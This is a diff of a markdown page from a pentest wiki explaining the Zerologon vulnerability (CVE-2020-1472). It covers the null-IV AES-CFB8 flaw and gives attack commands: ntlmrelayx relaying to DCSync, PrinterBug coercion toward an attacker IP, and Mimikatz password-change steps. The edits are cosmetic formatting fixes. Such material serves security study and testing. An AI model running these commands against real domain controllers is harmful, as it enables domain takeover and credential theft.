@@ -6,19 +6,19 @@ description: CVE-2020-1472
 
 ## Theory
 
-Netlogon is a service verifying logon requests, registering, authenticating, and locating domain controllers. MS-NRPC, the Netlogon Remote Protocol RPC interface is an authentication mechanism part of that service. MS-NRPC is used primarily to maintain the relationship between a machine and its domain, and relationships among domain controllers \(DCs\) and domains.
+Netlogon is a service verifying logon requests, registering, authenticating, and locating domain controllers. MS-NRPC, the Netlogon Remote Protocol RPC interface is an authentication mechanism part of that service. MS-NRPC is used primarily to maintain the relationship between a machine and its domain, and relationships among domain controllers (DCs) and domains.
 
-The CVE-2020-1472 findings demonstrated that MS-NRPC used a custom and insecure cryptographic protocol \(i.e. it reuses a known, static, zero-value Initialization Vector \(IV\) in an AES-CFB8 mode\) when establishing a Netlogon Secure Channel connection to a Domain Controller allowing for an Elevation of Privilege vulnerability.
+The CVE-2020-1472 findings demonstrated that MS-NRPC used a custom and insecure cryptographic protocol (i.e. it reuses a known, static, zero-value Initialization Vector (IV) in an AES-CFB8 mode) when establishing a Netlogon Secure Channel connection to a Domain Controller allowing for an Elevation of Privilege vulnerability.
 
-There were many concepts to understand in the original exploit scenario \(the "[password change](zerologon.md#password-change-disruptive)" one\).
+There were many concepts to understand in the original exploit scenario (the "[password change](zerologon.md#password-change-disruptive)" one).
 
-* **Concept \#1**: authentication through MS-NRPC uses AES-CFB8. This means that for 1 in 256 possibilities, every block of the ciphertext will be `\x00` bytes if both the IV and the plaintext are `\x00` bytes.
-* **Concept \#2**: authentication through MS-NRPC uses a static and null IV \(only `\x00` bytes, hence partly validating concept \#1\).
-* **Concept \#3**: MS-NRPC signing and sealing don't rely on the same vulnerable mechanisms but are optional and can be ignored.
-* **Concept \#4**: machine accounts have an unlimited number of login attempts, hence allowing for an authentication bypass and the spoofing of these accounts thanks to concepts \#1 and \#2 \(by using a plaintext filled with `\x00` bytes and by doing enough attempts\).
-* **Concept \#5**: the `NetrServerPasswordSet2`  call can be used to reset an account's password. The new password structure to supply in this call has to be encrypted with the same vulnerable mechanisms stated in concepts \#1 and \#2.
-* **Concept \#6**: the password structure can be filled with `\x00` bytes, leading to the setting a new password of a 0 characters length for the target account.
-* **Concept \#7**: all previous concepts can be chained to reset a domain controller's password and obtain domain-admin privileges.
+* **Concept #1**: authentication through MS-NRPC uses AES-CFB8. This means that for 1 in 256 possibilities, every block of the ciphertext will be `\x00` bytes if both the IV and the plaintext are `\x00` bytes.
+* **Concept #2**: authentication through MS-NRPC uses a static and null IV (only `\x00` bytes, hence partly validating concept #1).
+* **Concept #3**: MS-NRPC signing and sealing don't rely on the same vulnerable mechanisms but are optional and can be ignored.
+* **Concept #4**: machine accounts have an unlimited number of login attempts, hence allowing for an authentication bypass and the spoofing of these accounts thanks to concepts #1 and #2 (by using a plaintext filled with `\x00` bytes and by doing enough attempts).
+* **Concept #5**: the `NetrServerPasswordSet2`  call can be used to reset an account's password. The new password structure to supply in this call has to be encrypted with the same vulnerable mechanisms stated in concepts #1 and #2.
+* **Concept #6**: the password structure can be filled with `\x00` bytes, leading to the setting a new password of a 0 characters length for the target account.
+* **Concept #7**: all previous concepts can be chained to reset a domain controller's password and obtain domain-admin privileges.
 
 ## Practice
 
@@ -26,19 +26,19 @@ There were many concepts to understand in the original exploit scenario \(the "[
 
 Another technique, [showcased by Dirk-jan](https://dirkjanm.io/a-different-way-of-abusing-zerologon/) no later than 2 weeks after the public disclosure, highlighted another way of exploiting the vulnerability. That technique relies on a [relayed authentication](../ntlm/relay.md) to directly operate a [DCSync](../credentials/dumping/dcsync.md), hence having no impact on the continuity of services.
 
-In order to operate the attack, the [Impacket](https://github.com/SecureAuthCorp/impacket)'s script [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) \(Python\) can be used.
+In order to operate the attack, the [Impacket](https://github.com/SecureAuthCorp/impacket)'s script [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python) can be used.
 
 ```bash
 ntlmrelayx -t dcsync://$domain_controller_2 -smb2support
 ```
 
-Once the relay servers are up and running and waiting for incoming trafic, attackers need to coerce a Domain Controller's authentication \(or from another account with enough privileges\). One way of doing this is to rely on the [PrinterBug](../mitm-and-coerced-authentications/ms-rprn.md).
+Once the relay servers are up and running and waiting for incoming trafic, attackers need to coerce a Domain Controller's authentication (or from another account with enough privileges). One way of doing this is to rely on the [PrinterBug](../mitm-and-coerced-authentications/ms-rprn.md).
 
 ```bash
 dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1
 ```
 
-### Password change \( ⚠ disruptive\)
+### Password change ( :warning: disruptive)
 
 {% hint style="danger" %}
 This technique can break the domain's replication services hence leading to massive disruption, running the following "password change" technique is **not advised**.
@@ -73,7 +73,7 @@ zerologon-restore 'Domain'/'DC_account'@'Domain_controller' -target-ip 'DC_IP_ad
 {% endtab %}
 
 {% tab title="Windows" %}
-The attack can also be conducted from Windows systems with [Mimikatz](https://github.com/gentilkiwi/mimikatz) \(C\).
+The attack can also be conducted from Windows systems with [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C).
 
 ```bash
 # Scan for the vulnerability
@@ -99,9 +99,7 @@ lsadump::changentlm /server:'Domain_controller' /user:'DC_account$' /oldntlm:'31
 
 ## References
 
-{% embed url="https://www.secura.com/blog/zero-logon" caption="" %}
+{% embed url="https://www.secura.com/blog/zero-logon" %}
 
 {% embed url="https://github.com/dirkjanm/CVE-2020-1472" %}
-
-
 
